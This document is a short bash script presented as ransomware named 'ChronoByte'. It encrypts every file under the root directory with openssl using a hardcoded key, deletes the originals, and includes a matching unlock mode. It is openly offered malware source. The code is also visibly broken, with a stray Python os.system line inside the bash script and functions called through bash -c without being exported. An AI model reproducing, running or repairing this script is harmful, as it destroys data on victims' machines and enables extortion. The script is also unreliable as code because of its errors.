#!/bin/bash
#Author:HackexDecodebreaker
#Date:......
#This tool is a dangerous ramsomeware that locks all files on a computer system without leaving any
# Define the key


os.system("clear;figlet             ChronoByte")
KEY="1234"

# Function to lock a file
lock_file() {
    local file=$1
    openssl enc -aes-256-cbc -salt -in "$file" -out "$file.locked" -k "$KEY"
    rm "$file"
}

# Function to unlock a file
unlock_file() {
    local file=$1
    openssl enc -aes-256-cbc -d -in "$file" -out "${file%.locked}" -k "$KEY"
    rm "$file"
}

# Check if the script should lock or unlock files
if [ "$1" == "lock" ]; then
    # Lock all files on the computer
    find / -type f ! -name "$0" ! -path "/dev/*" ! -path "/proc/*" ! -path "/sys/*" -exec bash -c 'lock_file "$0"' {} \;
    echo "All files have been locked."
elif [ "$1" == "unlock" ]; then
    # Unlock all locked files
    find / -type f -name "*.locked" -exec bash -c 'unlock_file "$0"' {} \;
    echo "All files have been unlocked."
else
    echo "Usage: $0 [lock|unlock]"
fi
